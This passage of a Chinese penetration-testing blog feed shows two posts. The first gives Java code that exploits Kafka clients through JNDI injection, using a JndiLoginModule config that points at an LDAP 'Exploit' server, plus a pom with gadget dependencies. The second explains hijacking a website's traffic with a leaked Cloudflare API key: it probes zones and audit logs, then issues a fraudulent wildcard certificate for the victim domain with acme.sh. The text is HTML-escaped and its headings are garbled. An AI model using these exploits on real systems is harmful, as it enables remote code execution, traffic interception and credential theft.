bin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-factor &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; --partitions &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; --topic &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;æµ‹è¯•ä»£ç &quot;&gt;&lt;a href=&quot;#æµ‹è¯•ä»£ç &quot; class=&quot;headerlink&quot; title=&quot;æµ‹è¯•ä»£ç &quot;&gt;&lt;/a&gt;æµ‹è¯•ä»£ç &lt;/h3&gt;&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;org&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apache&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;kafka&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;clients&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;producer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;KafkaProducer&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;org&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apache&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;kafka&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;clients&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;producer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Producer&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;org&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apache&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;kafka&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;clients&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;producer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ProducerRecord&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
 
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Properties&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
 
&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Main&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Properties&lt;/span&gt; props &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Properties&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sasl.mechanism&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;SCRAM-SHA-256&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;security.protocol&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;SASL_SSL&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sasl.jaas.config&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;com.sun.security.auth.module.JndiLoginModule &quot;&lt;/span&gt;
                    &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;required user.provider.url=\&quot;ldap://0.0.0.0:1389/Exploit\&quot; &quot;&lt;/span&gt;
                    &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; &quot;&lt;/span&gt;
                    &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;group.provider.url=\&quot;xxx\&quot;;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;bootstrap.servers&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;0.0.0.0:9092&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;key.deserializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;value.deserializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;key.serializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;org.apache.kafka.common.serialization.StringSerializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;value.serializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;org.apache.kafka.common.serialization.StringSerializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token class-name&quot;&gt;Producer&lt;/span&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; producer &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;KafkaProducer&lt;/span&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;props&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            producer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ProducerRecord&lt;/span&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;test&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;hello&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;world&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            producer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;pom.xmlæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-xml&quot; data-language=&quot;xml&quot;&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;dependencies&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;dependency&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;groupId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;org.apache.kafka&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;groupId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;artifactId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;kafka-clients&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;artifactId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;version&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;3.3.0&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;version&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;dependency&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;dependency&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;groupId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;commons-beanutils&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;groupId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;artifactId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;commons-beanutils&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;artifactId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;version&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;1.8.3&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;version&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;dependency&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;dependencies&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;ç”Ÿæˆååºåˆ—åŒ–æ•°æ®&quot;&gt;&lt;a href=&quot;#ç”Ÿæˆååºåˆ—åŒ–æ•°æ®&quot; class=&quot;headerlink&quot; title=&quot;ç”Ÿæˆååºåˆ—åŒ–æ•°æ®&quot;&gt;&lt;/a&gt;ç”Ÿæˆååºåˆ—åŒ–æ•°æ®&lt;/h3&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>åˆ©ç”¨OpenRestyè¿›è¡ŒåŸŸåæµé‡åŠ«æŒ</title>
    <link href="https://jkme.github.io/2023/02/13/cname-hijack-openresty.html"/>
    <id>https://jkme.github.io/2023/02/13/cname-hijack-openresty.html</id>
    <published>2023-02-12T16:00:00.000Z</published>
    <updated>2023-03-30T06:19:37.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>æ”»å‡»è€…å…·æœ‰ä¿®æ”¹åŸŸåè§£æè®°å½•çš„æƒé™ï¼ˆæ¯”å¦‚æ‹¥æœ‰CloudFlareçš„API Keyï¼‰ï¼Œå¯ä»¥ä¿®æ”¹CNAMEæˆ–è€…Aè®°å½•ï¼Œæƒ³é€šè¿‡ä¿®æ”¹åŸŸåè§£æè®°å½•çš„æ–¹å¼ï¼Œè·å–ç›®æ ‡ç½‘ç«™çš„æ‰€æœ‰æµé‡ï¼ˆåŒ…æ‹¬ä½†ä¸é™äºPOSTæ˜æ–‡è¯·æ±‚ï¼‰ã€‚å¯ä»¥åˆ©ç”¨OpenRestyçš„Luaæ‰©å±•åŠŸèƒ½ï¼Œè®°å½•HTTPè¯·æ±‚ä½“å’Œç›¸åº”çš„Responseã€‚é¡ºå˜´æä¸€å¥ï¼Œåœ¨CloudFalreé‡Œé¢ï¼Œä¸€èˆ¬çš„æ¥å£æ“ä½œéƒ½å¯ä»¥ç”¨API Keyå®Œæˆï¼Œä½†æ˜¯ä¸€æ—¦æ¶‰åŠåˆ°è¯ä¹¦çš„ç»­è®¢ä¸‹è½½ç­‰æ“ä½œï¼Œéœ€è¦ç”¨CA Keyã€‚</p><h2 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h2><p>é¦–å…ˆå¯ä»¥é€šè¿‡APIæ¥å£æŸ¥çœ‹æ³„æ¼çš„keyæ˜¯å¦ç”Ÿæ•ˆï¼š</p><h4 id="æŸ¥çœ‹Zones"><a href="#æŸ¥çœ‹Zones" class="headerlink" title="æŸ¥çœ‹Zones"></a>æŸ¥çœ‹Zones</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æŸ¥çœ‹Zoneså¯¹åº”çš„DNSè®°å½•"><a href="#æŸ¥çœ‹Zoneså¯¹åº”çš„DNSè®°å½•" class="headerlink" title="æŸ¥çœ‹Zoneså¯¹åº”çš„DNSè®°å½•"></a>æŸ¥çœ‹Zoneså¯¹åº”çš„DNSè®°å½•</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_records<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æŸ¥çœ‹å®¡è®¡æ—¥å¿—"><a href="#æŸ¥çœ‹å®¡è®¡æ—¥å¿—" class="headerlink" title="æŸ¥çœ‹å®¡è®¡æ—¥å¿—"></a>æŸ¥çœ‹å®¡è®¡æ—¥å¿—</h4><p>è·å–æœ€è¿‘çš„ç™»é™†æ—¥å¿—ã€æ“ä½œæ—¥å¿—ã€å®¢æˆ·ç«¯IPç­‰ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/accounts/<span class="token operator">&lt;</span>Account ID<span class="token operator">></span>/audit_logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æŸ¥çœ‹æœ€è¿‘çš„DNSè¯·æ±‚æ•°é‡"><a href="#æŸ¥çœ‹æœ€è¿‘çš„DNSè¯·æ±‚æ•°é‡" class="headerlink" title="æŸ¥çœ‹æœ€è¿‘çš„DNSè¯·æ±‚æ•°é‡"></a>æŸ¥çœ‹æœ€è¿‘çš„DNSè¯·æ±‚æ•°é‡</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_analytics/report?dimensions<span class="token operator">=</span>responseCode,queryName<span class="token operator">&amp;</span><span class="token assign-left variable">metrics</span><span class="token operator">=</span>queryCount<span class="token operator">&amp;</span><span class="token assign-left variable">sort</span><span class="token operator">=</span>+responseCode,-queryName<span class="token operator">&amp;</span><span class="token assign-left variable">filters</span><span class="token operator">=</span>responseCode<span class="token operator">==</span>NOERROR<span class="token operator">&amp;</span><span class="token assign-left variable">since</span><span class="token operator">=</span><span class="token number">2023</span>-02-13T12:00:00Z<span class="token operator">&amp;</span><span class="token assign-left variable">until</span><span class="token operator">=</span><span class="token number">2023</span>-02-13T18:00:00Z<span class="token operator">&amp;</span><span class="token assign-left variable">limit</span><span class="token operator">=</span><span class="token number">1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="HTTPSè¯ä¹¦"><a href="#HTTPSè¯ä¹¦" class="headerlink" title="HTTPSè¯ä¹¦"></a>HTTPSè¯ä¹¦</h2><p>å‡å¦‚ç›®æ ‡ç½‘ç«™æ˜¯httpsï¼Œä½†æ˜¯åˆè·å–ä¸åˆ°httpsçš„è¯ä¹¦ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨acme.shæ¥é‡æ–°ç”Ÿæˆå¦å¤–ä¸€ä»½HTTPSè¯ä¹¦ï¼Œå› ä¸ºå·²ç»æœ‰äº†DNSçš„è§£ææƒé™ï¼Œå¯ä»¥èµ°DNSéªŒè¯çš„æ–¹å¼æ¥è·å–åŸŸåè¯ä¹¦ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/root/.acme.sh/acme.sh --issue --dns -d <span class="token operator">&lt;</span>victim.com<span class="token operator">></span> -d <span class="token string">"*.&lt;victim.com>"</span> --yes-I-know-dns-manual-mode-enough-go-ahead-please/root/.acme.sh/acme.sh --renew --dns -d <span class="token operator">&lt;</span>victim.com<span class="token operator">></span> -d <span class="token string">"*.&lt;victim.com>"</span> --yes-I-know-dns-manual-mode-enough-go-ahead-please<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç¬¬ä¸€ä¸ªæ¡å‘½ä»¤ä¼šç”Ÿæˆä¸¤ä¸ªTXTè§£æï¼Œåˆ©ç”¨å·²æœ‰çš„DNSæƒé™åˆ›å»ºå¯¹åº”çš„TXTè§£æè®°å½•ï¼Œç„¶åè¿è¡Œç¬¬äºŒæ¡å‘½ä»¤ï¼Œä¸å‡ºæ„å¤–çš„è¯å¯ä»¥æˆåŠŸç”Ÿæˆè¯ä¹¦ã€‚è¿™æ—¶å¯ä»¥åˆ é™¤è¿™ä¸¤æ¡TXTè®°å½•ï¼Œæ³¨æ„ä½¿ç”¨dnsè®¤è¯çš„æ–¹å¼ç”Ÿæˆè¯ä¹¦ä¸å¯ä»¥è‡ªåŠ¨ç»­è®¢ã€‚<br>ç›¸å…³çš„CloudFlareæ¥å£ï¼š</p><h4 id="æ–°å¢DNS-Record"><a href="#æ–°å¢DNS-Record" class="headerlink" title="æ–°å¢DNS Record"></a>æ–°å¢DNS Record</h4><pre class="line-numbers 